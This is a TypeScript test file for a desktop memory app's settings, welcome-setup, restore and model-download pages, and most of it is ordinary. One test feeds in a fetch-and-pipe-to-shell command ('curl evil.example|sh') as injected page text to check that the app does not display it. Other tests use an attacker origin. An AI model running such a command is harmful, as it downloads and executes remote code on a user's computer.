/** The Mac app's pages (D3): Settings › Tools on this Mac, and the welcome. Fake HOME and tools only. */
import { test, type TestContext } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { request } from 'node:http';
import { toolEnv } from './desktopRoutes.js';
import { cachedAskCommands } from '../desktop/askCommands.js';
import { fakeHome } from '../testing/fakeTools.js';
import { loggedIn, makePages, makeService, startTestApp } from '../testing/helpers.js';
import { openDb } from '../db.js';
import { packArchive } from '../saved/archive.js';
import { backupNow } from '../backup.js';
import type { ModelManager } from '../models/manager.js';
import type { ModelChoice } from '../models/choice.js';
import type { ModelStatus } from '../models/manager.js';
import type { Hardware } from '../models/hardware.js';
import { createHash } from 'node:crypto';
import { ModelManager as RealManager } from '../models/manager.js';
import { SwitchableEmbedder, SwitchableReranker } from '../models/switchable.js';
import { GEMMA_PROFILE } from '../memory/embeddingProfile.js';
import { createFakeEmbedder } from '../memory/fakeEmbedder.js';
import type { CatalogueModel } from '../models/catalogue.js';

const CLAUDE_CONFIG = 'Library/Application Support/Claude/claude_desktop_config.json';

async function start(t: TestContext, opts: { localMode?: boolean } = { localMode: true }) {
  const f = fakeHome();
  t.after(() => f.cleanup());
  const statusDir = mkdtempSync(join(tmpdir(), 'brainai-status-'));
  const app = await startTestApp({ localMode: opts.localMode, noPassword: true, statusDir, tools: { home: f.home, path: `${f.bin}:${dirname(process.execPath)}:/usr/bin:/bin`, apps: f.apps, system: {}, claudeConfig: join(f.home, CLAUDE_CONFIG) } });
  t.after(() => app.close());
  return { app, f };
}

/** A page load as a browser sends it, signed in by local mode; returns the body and the session cookie. */
function openPage(baseUrl: string, path: string, cookie = ''): Promise<{ status: number; body: string; cookie: string; location?: string }> {
  const u = new URL(baseUrl);
  return new Promise((resolve, reject) => {
    const req = request({ host: '127.0.0.1', port: u.port, path, method: 'GET', setHost: false, headers: { Host: `localhost:${u.port}`, 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', ...(cookie ? { Cookie: cookie } : {}) } }, (res) => {
      let body = '';
      res.on('data', (c) => { body += c; });
      res.on('end', () => {
        const set = res.headers['set-cookie'] ?? [];
        resolve({ status: res.statusCode ?? 0, body, cookie: cookie || set.map((c) => c.split(';')[0]).join('; '), location: res.headers.location });
      });
    });
    req.on('error', reject);
    req.end();
  });
}
const post = (baseUrl: string, path: string, cookie: string, body: Record<string, string> = {}, origin = baseUrl) =>
  fetch(baseUrl + path, { method: 'POST', redirect: 'manual', headers: { Cookie: cookie, Origin: origin, 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams(body) });

test('Settings › Tools on this Mac lists the tools and connects and disconnects them', async (t) => {
  const { app, f } = await start(t);
  const settings = await openPage(app.baseUrl, '/settings');
  assert.match(settings.body, /<a[^>]*href="\/settings\/tools"[^>]*>[\s\S]*Tools on this Mac/);
  const page = await openPage(app.baseUrl, '/settings/tools', settings.cookie);
  assert.equal(page.status, 200);
  for (const name of ['Claude Code', 'Codex', 'OpenCode', 'Cursor']) assert.match(page.body, new RegExp(name));
  assert.match(page.body, /action="\/settings\/tools\/claude-code\/connect"/);
  const r = await post(app.baseUrl, '/settings/tools/claude-code/connect', settings.cookie);
  assert.equal(r.status, 303);
  assert.equal(r.headers.get('location'), '/settings/tools?tool=claude-code');
  assert.deepEqual(f.servers('claude'), { brainai: `${app.baseUrl}/mcp` });
  const after = await openPage(app.baseUrl, r.headers.get('location')!, settings.cookie);
  assert.match(after.body, /\/mcp, choose brainai and Authenticate/, 'the next step is said');
  assert.match(after.body, /action="\/settings\/tools\/claude-code\/disconnect"/);
  assert.equal((await post(app.baseUrl, '/settings/tools/claude-code/disconnect', settings.cookie)).status, 303);
  assert.deepEqual(f.servers('claude'), {});
});

test('another site cannot connect a tool, an unknown tool is 404, and none of it exists outside local mode', async (t) => {
  const { app, f } = await start(t);
  const s = await openPage(app.baseUrl, '/settings');
  assert.equal((await post(app.baseUrl, '/settings/tools/claude-code/connect', s.cookie, {}, 'https://attacker.example')).status, 403);
  assert.equal((await post(app.baseUrl, '/settings/tools/rm-rf/connect', s.cookie)).status, 404);
  assert.deepEqual(f.calls().filter((c) => c.includes(' add ')), []);
  const server = await start(t, { localMode: false });
  const res = await fetch(server.app.baseUrl + '/settings/tools', { redirect: 'manual' });
  assert.ok([302, 404].includes(res.status));
  const unknown = await fetch(server.app.baseUrl + '/no-such-page', { redirect: 'manual' });
  assert.equal(res.status === 302 ? 302 : unknown.status, res.status);
});

const ai = { type: 'ai', name: 'Claude Code' } as const;

test('a new Mac install opens on the welcome, and once it is done it never comes back by itself', async (t) => {
  const { app } = await start(t);
  const home = await openPage(app.baseUrl, '/');
  assert.equal(home.status, 302);
  assert.equal(home.location, '/welcome');
  const w1 = await openPage(app.baseUrl, '/welcome', home.cookie);
  assert.match(w1.body, /Your brain is running/);
  assert.match(w1.body, /action="\/welcome\/name"/);
  const named = await post(app.baseUrl, '/welcome/name', home.cookie, { name: 'Alex' });
  assert.equal(named.headers.get('location'), '/welcome?step=2');
  assert.deepEqual(app.deps.service.loadProfile().map((m) => m.content), ['The owner is called Alex.']);
  // An empty name saves nothing.
  await post(app.baseUrl, '/welcome/name', home.cookie, { name: '  ' });
  assert.equal(app.deps.service.loadProfile().length, 1);
  const w2 = await openPage(app.baseUrl, '/welcome?step=3', home.cookie);
  assert.match(w2.body, /Claude Code/);
  assert.match(w2.body, /<input type="hidden" name="back" value="welcome">/, 'Connect returns to the welcome');
  const w3 = await openPage(app.baseUrl, '/welcome?step=4', home.cookie);
  assert.match(w3.body, /data-setup-status="\/welcome\/first"/);
  const done = await post(app.baseUrl, '/welcome/done', home.cookie);
  assert.equal(done.headers.get('location'), '/');
  assert.equal((await openPage(app.baseUrl, '/', home.cookie)).status, 200, 'done sticks');
});

test('the welcome waits for the first memory or suggestion an assistant saves', async (t) => {
  const { app } = await start(t);
  const s = await openPage(app.baseUrl, '/');
  const first = async () => (await fetch(app.baseUrl + '/welcome/first', { headers: { Cookie: s.cookie } })).text();
  assert.match(await first(), /Waiting for your first memory/);
  await app.deps.service.remember({ kind: 'profile', content: 'Prefers short answers.' }, ai);
  assert.match(await first(), /Claude Code suggested: Prefers short answers\. It waits for your approval on Projects\./);
  await app.deps.service.remember({ kind: 'decision', content: 'The garden site uses SQLite.', project: 'garden-site' }, ai);
  assert.match(await first(), /Saved by Claude Code: The garden site uses SQLite\./);
});

test('the welcome does not interrupt a brain in use, and never exists outside local mode', async (t) => {
  const { app } = await start(t);
  await app.deps.service.remember({ kind: 'decision', content: 'Something already saved.', project: 'p' }, ai);
  assert.equal((await openPage(app.baseUrl, '/')).status, 200);
  const server = await start(t, { localMode: false });
  const unknown = await fetch(server.app.baseUrl + '/no-such-page', { redirect: 'manual' });
  const w = await fetch(server.app.baseUrl + '/welcome', { redirect: 'manual' });
  assert.ok([unknown.status, 302].includes(w.status));
});

test('another site cannot make the Tools page or the welcome say anything: only the last real result shows', async (t) => {
  const { app } = await start(t);
  const s = await openPage(app.baseUrl, '/settings');
  for (const path of ['/settings/tools?said=BrainAI+needs+you+to+run+curl+evil.example%7Csh', '/settings/tools?tool=codex', '/welcome?step=3&said=Run+this+command']) {
    const p = await openPage(app.baseUrl, path, s.cookie);
    assert.doesNotMatch(p.body, /curl evil|Run this command|role="status"/, path);
  }
});

test('on Windows the desktop pages say "this computer", never "this Mac"', async (t) => {
  const f = fakeHome();
  t.after(() => f.cleanup());
  const statusDir = mkdtempSync(join(tmpdir(), 'brainai-win-words-'));
  const app = await startTestApp({ localMode: true, noPassword: true, statusDir, tools: { platform: 'win32', home: f.home, path: f.bin, apps: f.apps } });
  t.after(() => app.close());
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  for (const path of ['/settings', '/settings/tools', '/settings/move', '/settings/reach', '/welcome']) {
    const page = await openPage(app.baseUrl, path, cookie);
    assert.doesNotMatch(page.body, /this Mac|on the Mac/i, path);
    assert.doesNotMatch(page.body, /\$\{/, `${path}: no template text left in the page`);
  }
  assert.match((await openPage(app.baseUrl, '/settings/tools', cookie)).body, /Tools on this computer/);
});

/** A saved copy with one fact and one page, made the way the real one is. */
async function savedArchive(): Promise<string> {
  const dir = mkdtempSync(join(tmpdir(), 'brainai-saved-src-'));
  const given = makeService({ now: () => new Date('2026-11-06T10:00:00Z') });
  await given.service.remember({ kind: 'decision', project: 'wildlog', content: 'Wildlog keeps photos on disk' }, { type: 'owner' });
  await makePages(given, () => new Date('2026-11-06T10:00:00Z')).create({ title: 'Wildlog setup', area: 'apps', body: 'Run it.' }, 'owner');
  const out = join(dir, 'brainai-saved-2026-11-06.tar.gz');
  await packArchive(given.db, dir, out, new Date('2026-11-06T10:00:00Z'));
  return out;
}
const upload = (baseUrl: string, cookie: string, body: Uint8Array | string, type = 'application/gzip') =>
  fetch(baseUrl + '/welcome/restore', { method: 'POST', headers: { Cookie: cookie, Origin: baseUrl, 'Content-Type': type }, body: body as BodyInit });

test('the welcome offers a saved folder only to an empty brain', async (t) => {
  const { app } = await start(t);
  const dataDir = app.deps.statusDir!;
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  const first = await openPage(app.baseUrl, '/welcome', cookie);
  assert.match(first.body, /I have a saved BrainAI folder/);
  const step = await openPage(app.baseUrl, '/welcome?restore=1', cookie);
  assert.match(step.body, /brainai-saved-….tar\.gz/);
  assert.match(step.body, /type="file"[^>]*accept="\.gz,\.db"/);
  const db = openDb(join(dataDir, 'memory.db'));
  db.prepare(`INSERT INTO memories(id, kind, content, project, tags, keys, embedding, created_at, created_by, updated_at, updated_by)
    VALUES ('m1','decision','Larder uses shelves','larder','[]','',x'00','2026-11-06','owner','2026-11-06','owner')`).run();
  db.close();
  assert.doesNotMatch((await openPage(app.baseUrl, '/welcome', cookie)).body, /saved BrainAI folder/);
  assert.doesNotMatch((await openPage(app.baseUrl, '/welcome?restore=1', cookie)).body, /type="file"/);
  assert.equal((await upload(app.baseUrl, cookie, 'x')).status, 409);
});

test('the welcome does not offer or take a saved folder while an app is connected: the import would drop it', async (t) => {
  const { app } = await start(t);
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  const archive = readFileSync(await savedArchive());
  // A revoked connection is not one: the offer stays.
  app.deps.db!.prepare("INSERT INTO oauth_grants(id, client_id, created_at, revoked_at) VALUES ('g0', 'c0', '2026-11-06', '2026-11-07')").run();
  assert.match((await openPage(app.baseUrl, '/welcome', cookie)).body, /I have a saved BrainAI folder/);
  app.deps.db!.prepare("INSERT INTO oauth_grants(id, client_id, created_at) VALUES ('g1', 'c1', '2026-11-06')").run();
  assert.doesNotMatch((await openPage(app.baseUrl, '/welcome', cookie)).body, /saved BrainAI folder/);
  assert.doesNotMatch((await openPage(app.baseUrl, '/welcome?restore=1', cookie)).body, /type="file"/);
  const r = await upload(app.baseUrl, cookie, archive);
  assert.equal(r.status, 409);
  assert.match((await r.json() as { error: string }).error, /connected/);
  assert.ok(!existsSync(join(app.deps.statusDir!, 'restore-pending')), 'nothing staged');
});

test('posting a good archive stages it and goes to /app/restart', async (t) => {
  const { app } = await start(t);
  const dataDir = app.deps.statusDir!;
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  const r = await upload(app.baseUrl, cookie, readFileSync(await savedArchive()));
  assert.equal(r.status, 200);
  assert.deepEqual(await r.json(), { next: '/app/restart' });
  assert.ok(existsSync(join(dataDir, 'restore-pending')), 'staged');
  assert.ok(!existsSync(join(dataDir, 'restore-upload.tar.gz')), 'the upload is deleted');
  const wait = await openPage(app.baseUrl, '/app/restart', cookie);
  assert.equal(wait.status, 200);
  assert.match(wait.body, /BrainAI is restarting/);
});

test('posting a bad archive shows the reason and stages nothing', async (t) => {
  const { app } = await start(t);
  const dataDir = app.deps.statusDir!;
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  const r = await upload(app.baseUrl, cookie, 'this is not an archive');
  assert.equal(r.status, 415);
  assert.match((await r.json() as { error: string }).error, /not a saved BrainAI file or backup \(a \.tar\.gz or a memory-….db\)/);
  // A real gzip mark but nothing a tar can read: sniffed as an archive, then refused by its check.
  const broken = await upload(app.baseUrl, cookie, new Uint8Array([0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3, 1, 2, 3]));
  assert.equal(broken.status, 422);
  assert.ok(((await broken.json()) as { error: string }).error.length > 5);
  assert.ok(!existsSync(join(dataDir, 'restore-pending')));
  assert.ok(!existsSync(join(dataDir, 'restore-upload.tar.gz')));
  assert.equal((await upload(app.baseUrl, cookie, 'x', 'text/plain')).status, 415);
  const anon = await fetch(app.baseUrl + '/welcome/restore', { method: 'POST', headers: { Origin: app.baseUrl, 'Content-Type': 'application/gzip' }, body: 'x', redirect: 'manual' });
  assert.notEqual(anon.status, 200);
});

test('posting a backup file (memory-<date>.db) stages it and goes to /app/restart, whatever the content type', async (t) => {
  const { app } = await start(t);
  const dataDir = app.deps.statusDir!;
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  const given = makeService({ now: () => new Date('2026-11-06T10:00:00Z') });
  await given.service.remember({ kind: 'decision', project: 'garden-club-site', content: 'The site is plain HTML' }, { type: 'owner' });
  const file = await backupNow(given.db, mkdtempSync(join(tmpdir(), 'brainai-backup-src-')), 1, new Date('2026-11-06T10:00:00Z'));
  const r = await upload(app.baseUrl, cookie, readFileSync(file), 'application/vnd.sqlite3');
  assert.equal(r.status, 200);
  assert.deepEqual(await r.json(), { next: '/app/restart' });
  assert.ok(existsSync(join(dataDir, 'restore-pending', 'memory.db')), 'staged');
  assert.ok(!existsSync(join(dataDir, 'restore-upload.tar.gz')), 'the upload is deleted');
});

test('step 3 says the saved brain is back after a restore, once', async (t) => {
  const { app } = await start(t);
  const dataDir = app.deps.statusDir!;
  mkdirSync(dataDir, { recursive: true });
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  writeFileSync(join(dataDir, 'restored.json'), JSON.stringify({ at: '2026-11-12T10:00:00Z', facts: 12, pages: 3 }));
  const p = await openPage(app.baseUrl, '/welcome?step=3', cookie);
  assert.match(p.body, /Your saved brain is back: 12 facts and 3 pages\./);
  assert.ok(!existsSync(join(dataDir, 'restored.json')));
  assert.doesNotMatch((await openPage(app.baseUrl, '/welcome?step=3', cookie)).body, /saved brain is back/);
  writeFileSync(join(dataDir, 'restored.json'), JSON.stringify({ refused: 'This brain already has memories, so the saved copy was not brought in.' }));
  assert.match((await openPage(app.baseUrl, '/welcome?step=3', cookie)).body, /already has memories/);
  writeFileSync(join(dataDir, 'restored.json'), JSON.stringify({ at: '2026-11-12T10:00:00Z', facts: 1, pages: 1 }));
  assert.match((await openPage(app.baseUrl, '/welcome?step=3', cookie)).body, /Your saved brain is back: 1 fact and 1 page\./);
});

test('step 3 says how many pictures a backup file could not bring, only when some were missing', async (t) => {
  const { app } = await start(t);
  const dataDir = app.deps.statusDir!;
  mkdirSync(dataDir, { recursive: true });
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  writeFileSync(join(dataDir, 'restored.json'), JSON.stringify({ at: '2026-11-12T10:00:00Z', facts: 2, pages: 1, pictures_missing: 3 }));
  assert.match((await openPage(app.baseUrl, '/welcome?step=3', cookie)).body, /3 pictures were not in the backup file: their pages kept their text\./);
  writeFileSync(join(dataDir, 'restored.json'), JSON.stringify({ at: '2026-11-12T10:00:00Z', facts: 2, pages: 1, pictures_missing: 0 }));
  assert.doesNotMatch((await openPage(app.baseUrl, '/welcome?step=3', cookie)).body, /not in the backup file/);
});

test('a successful Connect or Disconnect refreshes the ask commands at once, so the next session sees it', async (t) => {
  const { app } = await start(t);
  const reader = cachedAskCommands(toolEnv(app.deps)!);
  app.deps.askCommands = reader; app.deps.refreshAskCommands = reader.refresh;
  await reader.refresh();
  assert.deepEqual(reader(), {});
  const settings = await openPage(app.baseUrl, '/settings');
  assert.equal((await post(app.baseUrl, '/settings/tools/codex/connect', settings.cookie)).status, 303);
  assert.deepEqual(Object.keys(reader()), ['Codex']);
  assert.equal((await post(app.baseUrl, '/settings/tools/codex/disconnect', settings.cookie)).status, 303);
  assert.deepEqual(reader(), {});
});

// ---- Step 2: the search models (made-up computer, made-up manager: nothing is downloaded) ----

const GB = 1024 ** 3;
const computer = (o: Partial<Hardware> = {}): Hardware => ({ arch: 'arm64', platform: 'darwin', memoryBytes: 16 * GB, freeDiskBytes: 412 * GB, ...o });

/** A stand-in for the app's model manager: it records what was chosen and says what it is told. */
function fakeModels(o: { status?: Partial<ModelStatus>; installed?: string[] } = {}) {
  const chosen: ModelChoice[] = [];
  const m = {
    status: (): ModelStatus => ({ choice: chosen.at(-1) ?? null, progress: [], searchReady: false, ...o.status }),
    choose: async (c: ModelChoice) => { chosen.push(c); },
    installedIds: async () => o.installed ?? [],
  };
  return { chosen, manager: m as unknown as ModelManager };
}

async function withModels(t: TestContext, o: Parameters<typeof fakeModels>[0] = {}, hw: Partial<Hardware> = {}) {
  const s = await start(t);
  const fm = fakeModels(o);
  s.app.deps.models = fm.manager;
  s.app.deps.hardware = async () => computer(hw);
  const cookie = (await openPage(s.app.baseUrl, '/settings')).cookie;
  return { ...s, ...fm, cookie };
}

test('step 1 leads to step 2 and says "Step 1 of 4"', async (t) => {
  const { app, cookie } = await withModels(t);
  const w1 = await openPage(app.baseUrl, '/welcome', cookie);
  assert.match(w1.body, /Step 1 of 4/);
  assert.match(w1.body, /action="\/welcome\/name"/);
});

test('the welcome is a desktop setup: its own frame, the four steps with the current one marked and the earlier ones done, buttons in one row', async (t) => {
  const { app, cookie } = await withModels(t);
  const p = await openPage(app.baseUrl, '/welcome?step=3', cookie);
  assert.match(p.body, /<body class="setup"/, 'not the phone-width sign-in layout');
  assert.doesNotMatch(p.body, /class="top solo"/, 'the brand lives in the step list');
  assert.match(p.body, /<ol class="setup-steps" aria-label="Setup steps">/);
  assert.match(p.body, /<li class="done"><span class="step-mark"><svg[^]*?<\/svg><\/span><span>Your name<\/span><span class="visually-hidden"> \(done\)<\/span><\/li>/);
  assert.match(p.body, /<li class="current" aria-current="step"><span class="step-mark">3<\/span><span>Connect<\/span><\/li>/);
  assert.match(p.body, /<li class="todo"><span class="step-mark">4<\/span><span>Try it<\/span><\/li>/);
  assert.match(p.body, /Step 3 of 4/, 'still said, for a narrow window and screen readers');
  assert.match(p.body, /<p class="setup-actions"><a class="button primary" href="\/welcome\?step=4">Next<\/a><\/p>/);
  // The ChatGPT note is one sentence around its link, not a wrapping row of pieces.
  assert.match(p.body, /<span class="meta note">ChatGPT's app can't reach a brain/);
});

test('step 2 explains the two models, shows this computer and the recommended pair with size, licence and numbers', async (t) => {
  const { app, cookie } = await withModels(t);
  const p = await openPage(app.baseUrl, '/welcome?step=2', cookie);
  assert.equal(p.status, 200);
  assert.match(p.body, /Step 2 of 4/);
  assert.match(p.body, /<h1>How BrainAI finds things<\/h1>/);
  assert.match(p.body, /finds your memories by meaning/);
  assert.match(p.body, /finds your memories by meaning, in any language \(“the car charger” finds “EV wallbox”\)/);
  assert.match(p.body, /puts the right one first/);
  assert.match(p.body, /Apple M-series chip/);
  assert.match(p.body, /16 GB memory/);
  assert.match(p.body, /412 GB free/);
  assert.match(p.body, /Balanced[\s\S]*recommended/);
  assert.match(p.body, /Light/);
  assert.match(p.body, /Standard/);
  assert.match(p.body, /None/);
  assert.match(p.body, /135 MB/, 'Light, from its bytes');
  assert.match(p.body, /219 MB/, 'Balanced');
  assert.match(p.body, /MIT/);
  assert.match(p.body, /Gemma Terms of Use/);
  assert.match(p.body, /found 150 of 168 first/);
  assert.match(p.body, /for each search, your question and about 20 best matches are sent to this service/);
  assert.match(p.body, /Set it up later in Settings › Search/);
  assert.doesNotMatch(p.body, /Strong/);
  assert.match(p.body, /Download 355 MB and continue/, 'Balanced + Standard');
  assert.match(p.body, /Choose the models myself/);
});

test('step 3 says Continue when the suggested models are already installed, and suggests Light + none on a small computer', async (t) => {
  const a = await withModels(t, { installed: ['gemma', 'mminilm'] });
  assert.match((await openPage(a.app.baseUrl, '/welcome?step=2', a.cookie)).body, />Continue</);
  const b = await withModels(t, {}, { arch: 'x64', memoryBytes: 2 * GB });
  const body = (await openPage(b.app.baseUrl, '/welcome?step=2', b.cookie)).body;
  assert.match(body, /64-bit Intel\/AMD/);
  assert.match(body, /Download 135 MB and continue/);
});

test('step 2 headings never use "embedding", "cross-encoder" or "ONNX"', async (t) => {
  const { app, cookie } = await withModels(t);
  for (const step of [1, 2, 3, 4]) {
    const body = (await openPage(app.baseUrl, `/welcome?step=${step}`, cookie)).body;
    for (const h of body.match(/<h[1-3][^>]*>[\s\S]*?<\/h[1-3]>/g) ?? []) assert.doesNotMatch(h, /embedding|cross-encoder|onnx/i, h);
  }
  const first = (await openPage(app.baseUrl, '/welcome?step=2', cookie)).body.match(/<h1>[\s\S]*?<\/h1>\s*<p[^>]*>([\s\S]*?)<\/p>/)![1]!;
  assert.doesNotMatch(first, /embedding|cross-encoder|onnx/i);
});

test('posting "suggested" on a 16 GB Apple-silicon computer chooses Balanced + Standard and lands on step 3', async (t) => {
  const { app, cookie, chosen } = await withModels(t);
  const r = await post(app.baseUrl, '/welcome/models', cookie, { mode: 'suggested' });
  assert.equal(r.status, 303);
  assert.equal(r.headers.get('location'), '/welcome?step=3');
  assert.deepEqual(chosen, [{ search: 'gemma', rerank: 'mminilm' }]);
});

test('posting a custom choice picks that pair; none means no reranker; Online and anything unknown are refused', async (t) => {
  const { app, cookie, chosen } = await withModels(t);
  assert.equal((await post(app.baseUrl, '/welcome/models', cookie, { mode: 'custom', search: 'e5', rerank: 'none' })).headers.get('location'), '/welcome?step=3');
  assert.deepEqual(chosen, [{ search: 'e5', rerank: null }]);
  await post(app.baseUrl, '/welcome/models', cookie, { mode: 'custom', search: 'gemma', rerank: 'mminilm' });
  assert.deepEqual(chosen.at(-1), { search: 'gemma', rerank: 'mminilm' });
  for (const body of [{ mode: 'custom', search: 'e5', rerank: 'online' }, { mode: 'custom', search: 'nope', rerank: 'none' }, { mode: 'custom', search: 'e5', rerank: 'bge-m3-rerank' }, { mode: 'x' }] as Record<string, string>[]) {
    assert.equal((await post(app.baseUrl, '/welcome/models', cookie, body)).status, 400);
  }
  assert.equal(chosen.length, 2);
  assert.equal((await post(app.baseUrl, '/welcome/models', cookie, { mode: 'suggested' }, 'https://attacker.example')).status, 403);
});

test('step 3 shows the progress line, and the same line is on step 4', async (t) => {
  const { app, cookie } = await withModels(t, { status: { choice: { search: 'gemma', rerank: 'mminilm' }, progress: [
    { model: 'gemma', doneBytes: 64_000_000, totalBytes: 100_000_000, state: 'downloading' },
  ] } });
  for (const step of [3, 4]) {
    const body = (await openPage(app.baseUrl, `/welcome?step=${step}`, cookie)).body;
    assert.match(body, /data-models-progress/);
    assert.match(body, /Downloading the search models… 64 of 100 MB · 64% — keyword search already works/);
  }
});

test('a failed download shows the plain problem and a link to Settings › Search', async (t) => {
  const { app, cookie } = await withModels(t, { status: { choice: { search: 'gemma', rerank: null }, progress: [], problem: 'no connection to the model server' } });
  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
  assert.match(body, /no connection to the model server/);
  assert.match(body, /href="\/settings#search"/);
});

test('when only the reranker failed, the line says search by meaning works and names the reranker', async (t) => {
  const { app, cookie } = await withModels(t, { status: { choice: { search: 'gemma', rerank: 'mminilm' }, progress: [], searchReady: true, problem: 'no connection to the model server', problemWith: 'rerank' } });
  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
  assert.match(body, /Search by meaning works; the reranker \(Standard\) could not be set up: no connection to the model server\./);
  assert.doesNotMatch(body, /Keyword search still works|search models could not be set up/);
  assert.match(body, /href="\/settings#search"/);
});

test('when the search model failed, the line still says keyword search works', async (t) => {
  const { app, cookie } = await withModels(t, { status: { choice: { search: 'gemma', rerank: 'mminilm' }, progress: [], searchReady: false, problem: 'no connection to the model server', problemWith: 'search' } });
  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
  assert.match(body, /The search models could not be set up: no connection to the model server\. Keyword search still works\./);
  assert.doesNotMatch(body, /Search by meaning works/);
});

test('when a newly chosen search model failed but the earlier one serves, the line says search by meaning still works', async (t) => {
  const { app, cookie } = await withModels(t, { status: { choice: { search: 'e5', rerank: 'mminilm' }, progress: [], searchReady: true, problem: 'no connection to the model server', problemWith: 'search' } });
  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
  assert.match(body, /Search by meaning works with the model you had; Light could not be set up: no connection to the model server\./);
  assert.doesNotMatch(body, /Keyword search still works|search models could not be set up/);
  assert.match(body, /href="\/settings#search"/);
});

test('GET /models/progress gives the status, never the data folder path or a key', async (t) => {
  const s = await start(t);
  const dir = s.app.deps.statusDir!;
  s.app.deps.models = fakeModels({ status: { choice: { search: 'gemma', rerank: 'online', online: { model: 'a/b', ...{ apiKey: 'sk-or-secret' } } as never }, progress: [], problem: `could not write ${dir}/models/x` } }).manager;
  const app = s.app;
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  const r = await fetch(app.baseUrl + '/models/progress', { headers: { Cookie: cookie } });
  assert.equal(r.status, 200);
  const text = await r.text();
  const j = JSON.parse(text);
  assert.equal(j.searchReady, false);
  assert.equal(typeof j.line, 'string');
  assert.ok(!text.includes(dir), 'no data folder path');
  assert.doesNotMatch(text, /sk-or-secret|apiKey/);
  assert.equal((await fetch(app.baseUrl + '/models/progress', { redirect: 'manual' })).status === 200, false, 'owner only');
});

test('GET /models/progress carries the bar while downloading and ready once the test search passed', async (t) => {
  const s = await start(t);
  const cookie = (await openPage(s.app.baseUrl, '/settings')).cookie;
  const get = async () => (await fetch(s.app.baseUrl + '/models/progress', { headers: { Cookie: cookie } })).json() as Promise<{ bar: { value: number | null } | null; ready: boolean; line: string; busy: boolean }>;
  s.app.deps.models = fakeModels({ status: { choice: { search: 'gemma', rerank: null }, progress: [{ model: 'gemma', doneBytes: 25_000_000, totalBytes: 100_000_000, state: 'downloading' }] } }).manager;
  const during = await get();
  assert.deepEqual(during.bar, { value: 25 });
  assert.equal(during.ready, false);
  assert.equal(during.busy, true);
  s.app.deps.models = fakeModels({ status: { choice: { search: 'gemma', rerank: null }, progress: [], searchReady: true, checked: { ms: 52 } } }).manager;
  const after = await get();
  assert.equal(after.bar, null);
  assert.equal(after.ready, true);
  assert.equal(after.busy, false);
  assert.match(after.line, /^Search is ready and working: a test search on this (Mac|computer) took 52 ms\.$/);
});

// ---- Fix round 1 ----

test('on Windows step 2 says "this computer", never "this Mac", and names the 64-bit Intel/AMD chip', async (t) => {
  const f = fakeHome();
  t.after(() => f.cleanup());
  const statusDir = mkdtempSync(join(tmpdir(), 'brainai-win-models-'));
  const fm = fakeModels();
  const app = await startTestApp({ localMode: true, noPassword: true, statusDir, models: fm.manager, hardware: async () => computer({ arch: 'x64', platform: 'win32' }), tools: { platform: 'win32', home: f.home, path: f.bin, apps: f.apps } });
  t.after(() => app.close());
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  const body = (await openPage(app.baseUrl, '/welcome?step=2', cookie)).body;
  assert.match(body, /this computer/);
  assert.doesNotMatch(body, /this Mac/);
  assert.match(body, /64-bit Intel\/AMD/);
});

test('posting "suggested" twice quickly starts one download only', async (t) => {
  const s = await start(t);
  const dataDir = mkdtempSync(join(tmpdir(), 'brainai-mgr-data-'));
  const modelsDir = mkdtempSync(join(tmpdir(), 'brainai-mgr-models-'));
  const bytes = Buffer.from('made-up weights');
  const sha = createHash('sha256').update(bytes).digest('hex');
  const catalogue = (['e5', 'gemma', 'mminilm'] as const).map((id) => ({ id, kind: id === 'mminilm' ? 'rerank' : 'search', label: 'Light', repo: `example-org/${id}-tiny`, files: { 'm.bin': sha }, bytes: bytes.length, licence: 'MIT', measured: 'x', profile: id === 'mminilm' ? undefined : id }) as CatalogueModel);
  const db = openDb(':memory:');
  let open!: () => void;
  const gate = new Promise<void>((r) => { open = r; });
  const started: string[] = [];
  const aborted: string[] = [];
  const manager = new RealManager({
    dataDir, modelsDir, embedder: new SwitchableEmbedder(db, GEMMA_PROFILE), reranker: new SwitchableReranker(), db, dbPath: ':memory:', catalogue, log: () => {},
    // Like the real download: a stop rejects it at once; otherwise it finishes when the gate opens.
    download: async (m, _dir, o) => {
      started.push(m.id);
      await Promise.race([gate, new Promise((_r, reject) => o.signal?.addEventListener('abort', () => { aborted.push(m.id); reject(new Error('stopped')); }))]);
    },
    load: { embedder: async () => createFakeEmbedder(), reranker: async () => ({ score: async (_q: string, x: string[]) => x.map(() => 0) }) },
  });
  s.app.deps.models = manager;
  s.app.deps.hardware = async () => computer();
  const cookie = (await openPage(s.app.baseUrl, '/settings')).cookie;
  const [a, b] = await Promise.all([post(s.app.baseUrl, '/welcome/models', cookie, { mode: 'suggested' }), post(s.app.baseUrl, '/welcome/models', cookie, { mode: 'suggested' })]);
  assert.equal(a.status, 303);
  assert.equal(b.status, 303);
  await new Promise((r) => setTimeout(r, 50));
  open();
  await new Promise((r) => setTimeout(r, 300));
  assert.deepEqual(started, ['gemma', 'mminilm'], 'each model of the pair downloaded once, the second click started nothing');
  assert.deepEqual(aborted, [], 'the first work was never stopped');
});

test('the progress line shows a re-read when nothing is downloading, and the page polls', async (t) => {
  const { app, cookie } = await withModels(t, { status: { choice: { search: 'gemma', rerank: null }, progress: [], searchReady: false, rereading: true } });
  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
  assert.match(body, /Re-reading your memories with the new search model… keyword search works meanwhile/);
  assert.match(body, /data-busy/);
